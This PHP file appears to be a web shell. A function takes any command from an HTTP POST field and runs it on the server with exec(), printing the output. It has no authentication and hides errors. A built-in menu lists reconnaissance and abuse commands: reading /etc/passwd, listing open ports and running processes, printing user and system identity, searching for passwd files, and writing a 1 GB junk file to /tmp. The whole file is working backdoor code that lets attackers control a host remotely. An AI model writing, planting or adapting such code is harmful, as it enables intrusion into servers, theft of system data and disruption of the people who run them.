<?php
function cmd(){ // Command execution function
	$precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
	'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
	'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
	'Find passwd files'=>'find / -type f -name passwd');

	if($_POST['cmd'] != "")
		$x = $_POST['cmd'];
	elseif($_POST['precmd'] != "")
		$x = $_POST['precmd'];
	else
		die();

	$cmd = @exec($x, $result);
	
	foreach($result as $line)
		echo($line . "\n");
	
}

cmd();
?>